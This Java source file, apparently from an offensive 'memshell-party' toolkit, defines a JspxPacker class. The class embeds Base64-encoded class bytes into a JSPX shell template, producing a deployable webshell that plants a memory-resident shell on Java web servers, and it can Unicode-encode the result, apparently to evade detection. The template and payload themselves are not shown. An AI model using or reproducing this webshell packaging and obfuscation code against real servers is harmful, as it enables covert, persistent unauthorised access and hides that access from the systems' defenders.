package com.reajason.javaweb.packer.jsp;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.Util;
import com.reajason.javaweb.packer.spec.PackerSchema;
import lombok.SneakyThrows;

/**
 * @author ReaJason
 * @since 2024/11/26
 */
public class JspxPacker implements Packer<JspCustomPackerConfig> {

    private final String jspxTemplate = Util.loadTemplateFromResource("/memshell-party/shell.jspx");

    @Override
    @SneakyThrows
    public String pack(ClassPackerConfig<JspCustomPackerConfig> config) {
        String content = jspxTemplate.replace("{{className}}", config.getClassName())
                .replace("{{base64Str}}", config.getClassBytesBase64Str());
        JspCustomPackerConfig customConfig = config.getCustomConfig();
        if (customConfig != null && customConfig.isUnicode()) {
            return JspUnicoder.encode(content, false);
        }
        return content;
    }

    @Override
    public PackerSchema schema() {
        return JspCustomPackerConfig.schema();
    }
}
